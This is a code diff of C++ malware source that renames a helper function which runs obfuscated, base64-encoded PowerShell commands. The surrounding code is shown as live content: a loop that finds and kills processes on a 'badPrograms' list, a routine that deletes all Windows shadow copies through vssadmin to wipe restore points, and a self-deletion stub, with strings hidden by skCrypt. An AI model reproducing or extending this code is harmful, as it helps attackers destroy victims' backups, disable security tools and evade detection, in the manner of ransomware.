@@ -2,7 +2,7 @@
 
 using namespace std;
 
-string RunPSEncCommand(const string& cmd) {
+string RunEncCommand(const string& cmd) {
     return (string)skCrypt("powershell -enCoDEdcOmmAnD ") + Exec(((string)skCrypt("powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\\"") + cmd + (string)skCrypt("\\\"))")).c_str());
 }
 
@@ -35,14 +35,14 @@ DWORD RemoveTasks(LPVOID params) {
 
     while (true) {
         for (string badProgram : badPrograms) {
-            if (Exec(RunPSEncCommand(check1 + badProgram + check2).c_str()) == (string)skCrypt("False\n"))
-                system(RunPSEncCommand(kill1 + badProgram + kill2).c_str());
+            if (Exec(RunEncCommand(check1 + badProgram + check2).c_str()) == (string)skCrypt("False\n"))
+                system(RunEncCommand(kill1 + badProgram + kill2).c_str());
         }
     }
 }
 
 void DeleteRestorePoints() {
-    system(RunPSEncCommand((string)skCrypt("vssadmin delete shadows /all /quiet")).c_str());
+    system(RunEncCommand((string)skCrypt("vssadmin delete shadows /all /quiet")).c_str());
 }
 
 void DeleteMe(const string& myPath) {
